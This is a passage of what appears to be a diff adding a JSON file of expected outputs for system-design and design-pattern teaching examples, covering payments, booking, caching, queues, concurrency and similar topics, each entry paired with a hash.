+  "out": "create  -> Intent[id=pi_1, amountPaise=249900, state=CREATED, pspRef=null]\ncreate again (same key) -> pi_1 (same intent)\npay     -> Intent[id=pi_1, amountPaise=249900, state=SUCCEEDED, pspRef=psp_pi_1]\npay again -> SUCCEEDED (no second charge)\npay with PSP timeout -> PROCESSING (unknown outcome: do NOT retry blindly)\n  poller: PSP says psp_pi_2 captured -> mark SUCCEEDED\nledger: [pi_1 DEBIT customer 249900, pi_1 CREDIT merchant 249900, pi_2 DEBIT customer 99900, pi_2 CREDIT merchant 99900]\nreconciliation: our captured total 349800 vs PSP captured count 2 -> match"
+ },
+ "hotel-hld": {
+  "h": "b8048d70698c8cbe0ec5bff526dbe89da6a5e021",
+  "out": "asha: BOOKED 1 x suite nights 1-3\nravi: BOOKED 1 x suite nights 2-2\nzoya: BOOKED 1 x suite nights 3-4 (2 rooms x 1.10 overbooking = 2)\nkiran: BOOKED 11 x deluxe nights 1-2 (10 x 1.10 = 11 allowed)\nmeera: SOLD OUT on night 2\n  suite night 1: reserved 1/2\n  suite night 2: reserved 2/2\n  suite night 3: reserved 2/2\n  suite night 4: reserved 1/2\n  suite night 5: reserved 0/2"
+ },
+ "metrics-hld": {
+  "h": "ea91b5bf5394cc0d8b1250c4890dbce5c1a17432",
+  "out": "series stored: [cpu_percent{env=prod, host=web-1}, cpu_percent{env=prod, host=web-2}]\n  1-min rollup web-2 minute 0: 46.0%\n  1-min rollup web-2 minute 1: 50.5%\n  1-min rollup web-2 minute 2: 46.7%\n  1-min rollup web-2 minute 3: 50.7%\n  1-min rollup web-2 minute 4: 50.0%\n  1-min rollup web-2 minute 5: 94.8%\n  1-min rollup web-2 minute 6: 94.0%\n  1-min rollup web-2 minute 7: 93.5%\n  1-min rollup web-2 minute 8: 93.5%\n  1-min rollup web-2 minute 9: 94.5%\nt=360 alert HighCPU web-2: OK -> PENDING\nt=420 alert HighCPU web-2: PENDING -> FIRING  (page on-call)\ncardinality: 2 series; adding a per-request label like user_id would create millions"
+ },
+ "logging-hld": {
+  "h": "a669f3900869a44cbdc6769bcb587ac0df769b6e",
+  "out": "agent flushed a batch of 3 -> indexed\nagent flushed a batch of 3 -> indexed\nindices: [logs-11-24, logs-11-25, logs-11-26]\nsearch 11-26 'payment error timeout': [psp timeout after 3000ms]\nall logs for trace t3: [payment:psp timeout after 3000ms, order:retrying payment]\nretention (keep 2 days): indices now [logs-11-25, logs-11-26] (dropping a whole day is instant)"
+ },
+ "topk-hld": {
+  "h": "5c0786f34d5238b34a9d9a2cd9c65977e5465d7d",
+  "out": "approx top-3 (Count-Min + heap): [v0=13405, v1=2669, v2=1833]\nexact top-3                  : [v0=13281, v1=2549, v2=1716]\nmemory: sketch 4,000 counters vs exact map 41,089 keys\na rare video v14618: exact 1, sketch estimate 108 (only over-estimates, never under)"
+ },
+ "adclick-hld": {
+  "h": "8586958842892b49b7db5de1159ca8a2c4697d80",
+  "out": "dedupe: dropped duplicate c2\nemit window [0,60) -> {ad7=2, ad9=2}\ntoo late for streaming: c7 (left for the batch job)\nemit window [60,120) at shutdown -> {ad7=1}\nemit window [120,180) at shutdown -> {ad9=1}\nnightly batch (exact) : {0={ad7=3, ad9=2}, 60={ad7=1}, 120={ad9=1}}\nstreaming (real-time) : {0={ad7=2, ad9=2}, 60={ad7=1}, 120={ad9=1}} -> batch result replaces it for billing (lambda-style reconciliation)"
+ },
+ "jobscheduler-hld": {
+  "h": "d4b1e22c3918bc9ce218b06c59cff159233330a7",
+  "out": "t=0 worker-3 ran send-report ✔\nt=0 worker-1 ran charge-subscription ✔\nt=0 worker-3 ran flaky-webhook ✘ -> retry in 60 s\nt=60 worker-3 ran flaky-webhook ✘ -> retry in 120 s\nt=180 worker-3 ran flaky-webhook ✔\nt=300 worker-1 ran cleanup ✔\ncharge-subscription: DONE at t=0 by worker-1 (attempt 1)\ncleanup: DONE at t=300 by worker-1 (attempt 1)\nflaky-webhook: DONE at t=180 by worker-3 (attempt 3)\nsend-report: DONE at t=0 by worker-3 (attempt 1)"
+ },
+ "email-hld": {
+  "h": "c90994a6520cd44e5b1017ccfd7f76e053eb730c",
+  "out": "m1 from hr@company.com       -> [asha@mail.com, ravi@mail.com] [INBOX, spam score 0.0]\nm2 from asha@mail.com        -> [hr@company.com, ravi@mail.com] [INBOX, spam score 0.0]\nm3 from prize@win.biz        -> [asha@mail.com] [SPAM, spam score 1.1]\nasha's inbox: {m1=[INBOX, UNREAD], m3=[SPAM, UNREAD]}\nravi's thread view: [Offsite on Friday, Re: Offsite on Friday]\nasha searches 'offsite': [m1]\nmessages stored: 3, mailbox entries: 5"
+ },
+ "s3-hld": {
+  "h": "6339448204da55355a70d04cb9c279a0bcbdbf76",
+  "out": "PUT photos/2026/11/cat.jpg -> ObjectMeta[bucket=photos, key=2026/11/cat.jpg, size=33, etag=be1141b8abc6, placement=[node-1, node-2, node-3]]\nGET -> PRETEND-JPEG-BYTES-OF-A-CAT-PHOTO\n  node-1 lost -> rebuilt its fragment from node-2 XOR parity\nGET after losing node-1 -> PRETEND-JPEG-BYTES-OF-A-CAT-PHOTO | etag matches: true\nstorage overhead: 3 fragments of 17 bytes = 1.5x (3-way replication would be 3x)"
+ },
+ "fooddelivery-hld": {
+  "h": "1560b5f22c9087228b567d845833bbe9b1ccccaf",
+  "out": "  order: PLACED -> ACCEPTED\n  order: ACCEPTED -> PREPARING\n  rider r1: 0.5 km away, 2 active -> ready to pick up in 18 min\n  rider r2: 1.8 km away, 0 active -> ready to pick up in 15 min\n  rider r3: 4.0 km away, 0 active -> ready to pick up in 15 min\n  assign r2 (arrives as food is ready, not the nearest one who is busy)\n  order: PREPARING -> RIDER_ASSIGNED\n  order: RIDER_ASSIGNED -> PICKED_UP\n  live ETA at +0 min: 10 min (rider location every 5 s, sent to the customer app)\n  live ETA at +3 min: 7 min (rider location every 5 s, sent to the customer app)\n  live ETA at +6 min: 4 min (rider location every 5 s, sent to the customer app)\n  live ETA at +9 min: 1 min (rider location every 5 s, sent to the customer app)\n  order: PICKED_UP -> DELIVERED\n  rejected: DELIVERED -> CANCELLED not allowed"
+ },
+ "onlinejudge-hld": {
+  "h": "a86b07a075f32f41821a11c12e4d3408e37dded3",
+  "out": "asha (hash map)        -> Accepted (3/3)\nravi (swapped output)  -> Wrong Answer on test 1 (expected 0 1, got 1 0)\nzoya (infinite loop)   -> Time Limit Exceeded on test 1\nkiran (syntax error)   -> Compilation Error"
+ },
+ "leaderboard-hld": {
+  "h": "5512a4aa807abd9cd43d16a1f65321f5efabbbf0",
+  "out": "players: 50003\ntop 5: [p25321=1998, p26321=1998, p27321=1998, p28321=1998, p29321=1998]\nasha rank 12501, zoya rank 12502 (same score, asha got there first)\nfriends board: [asha=1500, zoya=1500, p42=1196, ravi=900]"
+ },
+ "googledocs-hld": {
+  "h": "03382a25d1e5b111b6474d175570db2133d45108",
+  "out": "v0 \"Hello world\"\nv1 asha  ins ','       at  5 (sent at  5, base v0) -> \"Hello, world\"\nv2 ravi  ins '!'       at 12 (sent at 11, base v0) -> \"Hello, world!\"\nv3 zoya  del 'Hello'   at  0 (sent at  0, base v0) -> \", world!\"\nv4 kiran ins 'Hi'      at  0 (sent at  0, base v3) -> \"Hi, world!\"\neveryone converges to: \"Hi, world!\""
+ },
+ "searchengine-hld": {
+  "h": "50d0d69c5c79f4299dc681bb0b09dc0f12814282",
+  "out": "PageRank: [blog=0.200, docs=0.140, spam=0.200, spam2=0.200, wiki=0.260]\nquery 'java threads':\n  wiki  text 0.94 x pagerank 0.260 = 0.244\n  blog  text 0.94 x pagerank 0.200 = 0.188\n  spam  text 0.62 x pagerank 0.200 = 0.125\n  docs  text 0.37 x pagerank 0.140 = 0.052"
+ },
+ "stockexchange-hld": {
+  "h": "9d4c8a56d4cbf88a05cd4e3d71e351effe3666cf",
+  "out": "book: bids [25@100, 40@99] | asks [80@101, 100@102]\n  trade 50 @ 101 (taker #6 BUY, maker #1)\n  trade 30 @ 101 (taker #6 BUY, maker #3)\n  trade 40 @ 102 (taker #6 BUY, maker #2)\nbook: bids [25@100, 40@99] | asks [60@102]\nafter aggressive sell: [trade 25 @ 100 (taker #7 SELL, maker #5), trade 40 @ 99 (taker #7 SELL, maker #4)]\nbook: bids [] | asks [5@99, 60@102]"
+ },
+ "mq-hld": {
+  "h": "a86fd3ec1a4a005ca1f5d6ba4a884f9670776bea",
+  "out": "produce order-1 -> acked at offset 0 on [broker-1, broker-2, broker-3]\nproduce order-2 -> acked at offset 1 on [broker-1, broker-2, broker-3]\nproduce order-3 -> acked at offset 2 on [broker-1, broker-2, broker-3]\nconsumer group 'billing' read [order-1, order-2, order-3], committed offset 3\nbroker-1 (leader) dies -> new leader broker-2 with 3 messages (nothing committed was lost)\nproduce order-4 -> acked at offset 3 on [broker-2, broker-3]\nbilling resumes from offset 3 -> [order-4]\nbroker-2 also dies; produce order-5 with min.insync=2 -> REJECTED (not enough in-sync replicas)"
+ },
+ "maps-hld": {
+  "h": "6ab7c14406e4e752880e75f39b9c06abbc85b73f",
+  "out": "fastest Home -> Airport: [Home, Ring Rd, Highway, Airport] = 23 min (6 nodes settled)\ntraffic jam on Highway -> reroute: [Home, Old Town, Market, Airport] = 26 min\nat country scale: precompute shortcuts (contraction hierarchies) and split the map into tiles/regions so a query settles thousands of nodes, not millions"
+ },
+ "zoom-hld": {
+  "h": "3ae8e3e359954fb8c10a6528e74f737a690aa394",
+  "out": "6 participants, 720p = 1500 kbps\nmesh: each uploads 5 copies = 7,500 kbps up, downloads 7,500 kbps -> phones melt beyond ~4 people\nSFU : each uploads 3 simulcast layers once = 2,150 kbps up; the server picks what to forward\n  asha (fibre)      20,000 kbps -> [kiran@720p, tile1@180p, tile2@180p, tile3@180p, tile4@180p] = 2,100 kbps\n  ravi (4G)          2,500 kbps -> [kiran@720p, tile1@180p, tile2@180p, tile3@180p, tile4@180p] = 2,100 kbps\n  zoya (weak wifi)     900 kbps -> [kiran@360p, tile1@180p, tile2@180p, (+2 paused)] = 800 kbps\naudio: mixed or forwarded separately (Opus ~32 kbps), prioritised over video when bandwidth drops"
+ },
+ "spotify-hld": {
+  "h": "bcf751c63695844d277c8fdd2a4db84bdc0683bf",
+  "out": "play Kesariya      268s @160kbps from CDN edge (hit)               5.4 MB  | prefetch next: Shape of You\nplay Shape of You  233s @160kbps from CDN edge (hit)               4.7 MB  | prefetch next: Naatu Naatu\nplay Naatu Naatu   216s @320kbps from origin -> CDN (miss, now cached) 8.6 MB\nsession data: 18.7 MB; play events for royalties: {t1=1, t2=1, t3=1}\noffline track on day 10: plays (licence valid)\noffline track on day 31: locked until the app comes online and renews the licence\nscale: 600M users x 25 tracks/day = 4.5e+11 streams/month -> play events go to Kafka, counted in batch"
+ },
+ "tinder-hld": {
+  "h": "8007084258e5b9f3ba4a596e083919d0417c8460",
+  "out": "asha's deck (10 km): [ravi, kiran]\n  MATCH: asha and ravi -> open chat\nasha's deck after swiping: [] (seen profiles are excluded)\nravi's deck: [neha]\n  MATCH: ravi and neha -> open chat\nmatches: [asha ❤ ravi, ravi ❤ neha]"
+ },
+ "distributed-tracing-hld": {
+  "h": "572b8095c2b71aba46e87a1d32f89475f18a7e50",
+  "out": "trace-A (384 ms) -> KEPT\n  gateway GET /checkout               384 ms \n    order createOrder                  40 ms \n    payment charge                    320 ms \n    email send                         14 ms \ntrace-B (104 ms) -> KEPT\n  gateway GET /checkout               104 ms ERROR\n    order createOrder                  34 ms \n    payment charge                     60 ms ERROR\ntrace-C (30 ms) -> dropped (fast and healthy)"
+ },
+ "llmserving-hld": {
+  "h": "7798824a291335f0f540e9db402ded75485d1424",
+  "out": "request      tokens  static-batch latency  continuous-batch latency (steps)\nlong-essay     400        400                   400\nhi               5          5                     5\ncode           120        120                   120\njoke            30        428                    30\nsum             60        457                    62\nq6              10        405                    37\naverage: static 303 vs continuous 109 steps; short requests no longer wait for the long essay\nKV cache: 512 KB per token -> a 4,000-token conversation holds 2.1 GB of GPU memory"
+ },
+ "gfs-hld": {
+  "h": "f73d0489609a083c3c8a15872b74f9c9f8035987",
+  "out": "/logs/2026-11-26.log (200 MB) -> 4 chunks\n  chunk-1 on [cs1, cs2, cs3]\n  chunk-2 on [cs1, cs4, cs5]\n  chunk-3 on [cs2, cs3, cs4]\n  chunk-4 on [cs1, cs2, cs5]\nclient reads offset 150 MB -> master says chunk-3 on [cs2, cs3, cs4]; data flows directly from a chunkserver, not the master\nt=60 heartbeat check -> dead: [cs2]\n  re-replicate chunk-1 to cs4 -> [cs1, cs3, cs4]\n  re-replicate chunk-3 to cs1 -> [cs1, cs3, cs4]\n  re-replicate chunk-4 to cs3 -> [cs1, cs3, cs5]"
+ },
+ "reddit-hld": {
+  "h": "da8f8793bb611b6a62d55f3fc95f2b0d4dfb0a59",
+  "out": "Old viral meme           score  5000  hot 14003.7878\nFresh system design tip  score   120  hot 14004.4880\nControversial take       score     0  hot 14002.3288\nfront page (hot): [Fresh system design tip, Old viral meme, Controversial take]\ntop (all time)  : [Old viral meme, Fresh system design tip, Controversial take]\n12.5 hours of age = 10x the votes: new posts get a chance; votes are buffered and the hot list is cached per subreddit"
+ },
+ "newsagg-hld": {
+  "h": "e7680117c37f42516772b72dcee0c8df42612fe2",
+  "out": "story (3 sources, freshest 1h): India beat Australia by 6 wickets in Perth Test\n   covered by [NDTV, TOI, ESPN]\nstory (2 sources, freshest 4h): RBI keeps repo rate unchanged at 6.5 percent\n   covered by [Reuters, Mint]\nstory (1 sources, freshest 1h): New phone launched with bigger battery\n   covered by [Verge]"
+ },
+ "wallet-hld": {
+  "h": "95c2ba63307f31e8bf3e1907e6ea7dc52527dc02",
+  "out": "SUCCESS r1\nSUCCESS r1 (retry returns the same result, no double debit)\nDECLINED insufficient balance\n200 concurrent opposite-direction transfers: 200 succeeded, no deadlock\nbalances {asha@upi=950100, ravi@upi=200000, shop@upi=49900}, total Rs 12,000.00 (money is conserved)\nledger entries: 402 (2 per successful transfer)"
+ },
+ "auction-hld": {
+  "h": "ed00925cf026dfd2394168600b44528f79ad28e0",
+  "out": "asha leads at 1100\nravi leads at 1200\n  proxy for asha -> asha leads at 1250\nravi leads at 1520\nzoya 1550 rejected: must be >= 1570\n100 concurrent bot bids: 20 accepted in order; leader bot2560 at 2560 (never a lower price over a higher one)\nkiran leads at 2700 (extended to t=630)\nasha leads at 3000 (extended to t=670) | ends at t=670\nravi 3100 rejected: auction ended"
+ },
+ "calendar-hld": {
+  "h": "20f8b90bccf758c930c558968cbf24a5e7243864",
+  "out": "merged busy: [09:30-09:45, 10:00-11:30, 12:00-14:00]\nearliest 45-min slot for [asha, ravi, zoya]: 14:00-14:45\ninvites sent; zoya's day: [09:30 standup, 12:00 interview, 14:00 planning]"
+ },
+ "cdn-hld": {
+  "h": "ca1c1e1b4b1a03f6bd27d1ccedd831b4db4e9178",
+  "out": "Chennai  /logo.png  -> MISS at chennai-pop -> shield MISS -> origin\nChennai  /logo.png  -> HIT  at chennai-pop\nDelhi    /logo.png  -> MISS at delhi-pop -> shield HIT\nChennai  /v.mp4     -> MISS at chennai-pop -> shield MISS -> origin\nChennai  /a.js      -> MISS at chennai-pop -> shield MISS -> origin\nChennai  /b.css     -> MISS at chennai-pop -> shield MISS -> origin\nChennai  /logo.png  -> MISS at chennai-pop -> shield HIT\nchennai-pop fails health checks -> GeoDNS sends Chennai users to mumbai-pop (+20 ms)\nChennai  /logo.png -> MISS at mumbai-pop -> shield HIT\norigin was hit 4 times for 8 requests (the shield protects the origin)"
+ },
+ "pricealert-hld": {
+  "h": "e98944b8e40a791766712e97a69b5acc79f0493f",
+  "out": "alerts indexed: 100003 for iphone-16\niphone-16 now Rs 72,000 -> 0 alert(s) triggered (no scan of the rest)\niphone-16 now Rs 68,000 -> 1 alert(s) triggered (no scan of the rest)\n   notify zoya: iphone-16 dropped below Rs 70,000\niphone-16 now Rs 64,999 -> 1 alert(s) triggered (no scan of the rest)\n   notify asha: iphone-16 dropped below Rs 65,000\nps5 now Rs 44,990 -> 0 alert(s) triggered (no scan of the rest)\nprices come from scrapers/partner feeds into a stream; only changed prices trigger this check"
+ },
+ "oop-pillars": {
+  "h": "ea2b99631a0ce43c2a63f7b6bafb235b7d724607",
+  "out": "credit card **** 4242 charged Rs 499\ndebit card **** 1881 charged Rs 499 (PIN verified)\nwallet debited Rs 499, left Rs 501\nencapsulation guard: invalid debit 1000000"
+ },
+ "solid": {
+  "h": "4e713c1b66d7bfe117e24183637c081abdb7eb24",
+  "out": "  notify: asha paid Rs 2249 (10% off)\n  notify: ravi paid Rs 1999 (Rs 500 off)\n  lambda discount works too: Rs 2199\nsaved orders: [asha:224910, ravi:199900]"
+ },
+ "uml": {
+  "h": "b803e7309bb1059f8626d6ab97933d79cf8a4b4e",
+  "out": "Bus is-a Vehicle with 6 wheels, has-a Engine 5000cc (composition)\nBus aggregates passengers [Asha, Kiran]\nTicket (Payable) Ticket[passenger=Passenger[name=Asha, age=30], amount=100] -> Rs 100\nTicket (Payable) Ticket[passenger=Passenger[name=Kiran, age=8], amount=50] -> Rs 50\nbus discarded: its Engine is gone too, but Asha still exists (aggregation)"
+ },
+ "creational-patterns": {
+  "h": "3afb8c36bf110820f9d0d013438f0846388dbb6f",
+  "out": "singleton same object? true, currency=INR\nfactory: email to asha: order shipped\nfactory: sms to asha: order shipped\nbuilder: large pizza [paneer, onion] + extra cheese\nprototype: {company=ShopCo, customer=Ravi, gst=29ABCDE}"
+ },
+ "structural-patterns": {
+  "h": "a8761ea087b38ff1b427c86a3e67f746195f00a8",
+  "out": "  [log] charge asha Rs 2499 -> true\nfacade: order confirmed, invoice emailed\n  [log] charge ravi Rs 200000 -> false\nfacade: payment failed, stock released\nproxy: 3 lookups, real API called 1 time\ncomposite: bundle price Rs 5291"
+ },
+ "behavioral-patterns": {
+  "h": "04b4fe490e5ea24b9ef86b95b5233765ae7a128b",
+  "out": "strategy normal 10 km -> Rs 150\nstrategy pool   10 km -> Rs 100\nstrategy surge  10 km -> Rs 270\nobserver email: order is SHIPPED\nobserver app push: SHIPPED\nstate: opening -> closing -> opening -> done\ncommand: 'Hello world!!'\nafter undo: 'Hello world'\nchain: 401 by auth handler | 429 by rate-limit handler | 200 handled by controller"
+ },
+ "concurrency-java": {
+  "h": "b125be8a2d07bde4fe155e3ced1aa256bc0f183b",
+  "out": "1. 4 threads x 100,000 increments: int++ = 217618 (lost updates), AtomicInteger = 400000\n2. 8 users race for seat A1 -> bookings made: 1\n3. producer -> bounded queue(5) -> consumer: sum 1..20 = 210\n4. CompletableFuture combine: 'Rs 2499, in stock' in ~60 ms (parallel, not 100)\n5. latch: all 3 workers finished = true\n6. ConcurrentHashMap word count from 4 threads: {be=8, not=4, or=4, to=8}"
+ },
+ "lld-approach": {
+  "h": "e66d6c48cd9b9e27ae72ba095ea6a6af2108e0a0",
+  "out": "Asha borrowed c1, due day 15\nRavi borrowed c2\nedge case handled: no copy of 978-1449373320 available\nedge case handled: Asha has reached the loan limit\nAsha returns on day 20 -> fine Rs 25\nZoya now borrows c1"
+ },
+ "api-contract-lld": {
+  "h": "32ca207fbb12a54da0c3c60363ff7224ea218eff",
+  "out": "OK  Booking[id=bk-1, userId=asha, showId=show-7, seats=[A1, A2], amountPaise=50000, status=CONFIRMED]\nOK  Booking[id=bk-1, userId=asha, showId=show-7, seats=[A1, A2], amountPaise=50000, status=CONFIRMED]  <- retry, same booking\nERR SEAT_UNAVAILABLE: seat A2 already booked\nERR INVALID_ARGUMENT: 1 to 6 seats required\nOK  Booking[id=bk-1, userId=asha, showId=show-7, seats=[A1, A2], amountPaise=50000, status=CONFIRMED]\nERR NOT_FOUND: no booking bk-9"
+ },
+ "feed-fanout": {
+  "h": "19f725c89dd0293d7204288ed65658951e45a718",
+  "out": "ravi posts p1 -> pushed into 2 follower feeds\nceleb posts p2 -> celebrity: stored once, pulled at read time\nravi posts p3 -> pushed into 2 follower feeds\nceleb posts p4 -> celebrity: stored once, pulled at read time\nasha's feed: [p4, p3, p2, p1]\nmeera's feed: [p4, p2]\ncache writes: 4 (with pure push the celebrity would cost 4 writes per post; with 100M followers, 100M)"
+ },
+ "counters": {
+  "h": "f884741a29908d5d434387ea8141c18c63971ff8",
+  "out": "single AtomicLong : 800,000 likes (all threads fight over one memory location)\nsharded LongAdder : 800,000 likes (threads write different cells; read = sum of cells)\nbuffered counting : db={post:0=133336, post:1=133336, post:2=133328} from 400,000 likes with only a few dozen DB writes"
+ },
+ "notification-pattern": {
+  "h": "a45a5c47abc65c8a53cf1212546e9229126b0959",
+  "out": "23:30 OTP for asha (priority 1):\n  -> push-queue: OTP 482913 for asha\n  -> email-queue: OTP 482913 for asha\n23:31 promo for asha (priority 3):\n  asha push delayed to morning (quiet hours)\n  -> email-queue: Diwali sale for asha\n10:00 shipment for ravi:\n  -> email-queue: order shipped for ravi\n  -> sms-queue: order shipped for ravi\n10:00 same event delivered twice by the queue:\n  skip duplicate e3:email\n  skip duplicate e3:sms"
+ },
+ "chat-delivery": {
+  "h": "d1d229a55db5ae28d534905cb53dfc669988c263",
+  "out": "asha -> ravi 'hi'        : ack ✓ seq=1, ravi offline -> push notification\nasha -> ravi 'you there?': ack ✓ seq=2, ravi offline -> push notification\nnetwork retry of c-2     : ack (duplicate c-2 ignored)\nravi reconnects, had seen seq 0 -> sync [1:hi, 2:you there?]\nravi -> asha 'yes!'      : ack ✓ seq=3, routed to chat-A -> delivered to asha\nasha's phone (seen seq 2) syncs -> [3:yes!]"
+ },
+ "video-streaming": {
+  "h": "5823bc4b823fff08b6b053440eb75ca0e67d2e5c",
+  "out": "seg  network   pick    buffer  note\n  1   6000 kbps  240p     4.0 s  \n  2   8000 kbps  480p     7.3 s  \n  3   8000 kbps  1080p    8.8 s  \n  4   1500 kbps  1080p    4.0 s  STALL (rebuffering)\n  5   1200 kbps  480p     4.0 s  STALL (rebuffering)\n  6   6000 kbps  480p     7.1 s  \n  7   9000 kbps  720p     9.8 s  \n  8  25000 kbps  720p    13.4 s  \n  9  25000 kbps  1080p   16.6 s  \nstalls: 2 - the smoothed throughput estimate lagged behind the sudden drop; a buffer-based rule (practice task 1) reacts faster\nstorage for a 10-minute video, all renditions: 1.98 GB"
+ },
+ "file-sync": {
+  "h": "e95018310e907b3f8e9949d4b3b74085fc6d729a",
+  "out": "laptop: notes.txt v1 = 4 chunks, uploaded 4 new, skipped 0\nlaptop: notes.txt v2 = 4 chunks, uploaded 1 new, skipped 3\nphone: copy.txt v1 = 4 chunks, uploaded 0 new, skipped 4\nphone: conflict on notes.txt (based on v1, server has v2) -> saved as 'notes (phone's conflicted copy).txt'\nphone: notes (phone's conflicted copy).txt v1 = 4 chunks, uploaded 1 new, skipped 3\nblock store holds 6 unique chunks for 4 files/versions"
+ },
+ "payments-ledger": {
+  "h": "f5cf2242e2e990b350b53098781946f0f4a76cf8",
+  "out": "rejected: unbalanced transaction: debits 500 != credits 400\ntx1 bank:settlement    debit Rs 2,000.00 credit           \ntx1 wallet:asha        debit            credit Rs 2,000.00\ntx2 wallet:asha        debit Rs 1,000.00 credit           \ntx2 merchant:shoeshop  debit            credit  Rs 980.00\ntx2 revenue:fees       debit            credit   Rs 20.00\ntx3 merchant:shoeshop  debit  Rs 980.00 credit           \ntx3 revenue:fees       debit   Rs 20.00 credit           \ntx3 wallet:asha        debit            credit Rs 1,000.00\nbalance wallet:asha = Rs 2,000.00\nbalance merchant:shoeshop = Rs 0.00\nbalance revenue:fees = Rs 0.00\nsum of all balances (+ settlement) = Rs 0.00  (always zero)"
+ },
+ "inventory-overselling": {
+  "h": "f3ef5bda247ee4834ec0f00e5a36f975e3662ac0",
+  "out": "check-then-act : 10 PS5s, 5,000 buyers -> up to 25 orders (OVERSOLD)\nconditional decrement: 10 PS5s, 5,000 buyers -> 10 orders, never more\nat minute 12, expired unpaid holds released -> 2 back in stock, still held: [zoya]"
+ },
+ "leaderboard-pattern": {
+  "h": "351cee9477ea156bcb10256aa35479640a4d0a5e",
+  "out": "top 3: [asha=90, kiran=90, ravi=80]\nrank of zoya: 4\nzoya +20 -> top 3: [asha=90, kiran=90, zoya=90] (ties: asha reached 90 first, ahead of zoya)\n100,003 players, top 3: [p23=99, p127=99, p189=99], asha's rank: 9204"
+ },
+ "crawler-politeness": {
+  "h": "4ca6c7ac7bfdd97433ea1889fd7697d9ae7c863d",
+  "out": "  robots.txt disallows shop.com/cart\nt=   0 ms fetch shop.com/\nt=   0 ms fetch blog.com/\nt=   0 ms fetch news.com/\nt= 500 ms fetch news.com/today\nt=1000 ms fetch shop.com/a\nt=2000 ms fetch shop.com/b\neach host is hit at most once per crawl-delay, while different hosts are fetched in parallel"
+ },
+ "recsys-ml": {
+  "h": "d829722a261dbc1b0ec64f6f95d7ad2e4647934f",
+  "out": "stage 1: 2,000 items -> 50 candidates by embedding similarity (an ANN index at scale)\nstage 2: ranked by similarity + predicted CTR + freshness\nstage 3: max 3 per category ->\n  v824   cricket  sim 0.90 ctr 0.108 age 42d\n  v884   cricket  sim 0.87 ctr 0.097 age  6d\n  v540   cricket  sim 0.88 ctr 0.098 age 18d\n  v1622  tech     sim 0.85 ctr 0.091 age 59d\n  v986   tech     sim 0.90 ctr 0.065 age  8d"
+ },
+ "llm-systems": {
+  "h": "6cbab6b9eacfcfa092f98db786fe4a85bbc74554",
+  "out": "retrieved:\n  0.28  Refunds are processed within 5 business days to the original payment method.\n  0.00  Shipping is free on orders above Rs 499 across India.\nprompt ~56 tokens, answer ~40 tokens\nask -> LLM call, stream tokens back over SSE\nask again -> served from answer cache (0 GPU time)\ncapacity: 200 req/s x 96 tokens = 19200 tokens/s -> ~10 GPUs at 2000 tokens/s each"
+ },
+ "read-write-heavy": {
+  "h": "65841d87198977663c5d0933b573f4e8b455431c",
+  "out": "read-heavy : 100,000 reads -> 3 DB reads (cache absorbs 99.997%)\nwrite-heavy: 1,000,000 events -> 200 batched sequential appends instead of 1,000,000 single-row writes\nrollup for dashboards: sensor 7 avg 25.2 over 1000 readings"
+ },
+ "hotspots": {
+  "h": "d32a9f1d8c6346c2bc6ddb4f0b196fcb55943e60",
+  "out": "requests per shard, one hot key : [12119, 11968, 11847, 51924, 12142]\nhot key copied to all 5 shards   : [20151, 19911, 19757, 20053, 20128]\npartition key = date            : [0, 0, 0, 0, 0, 0, 10000, 0]\npartition key = (date, i % 8)   : [1250, 1250, 1250, 1250, 1250, 1250, 1250, 1250]  (reads must query all 8 salts)"
+ }
+}
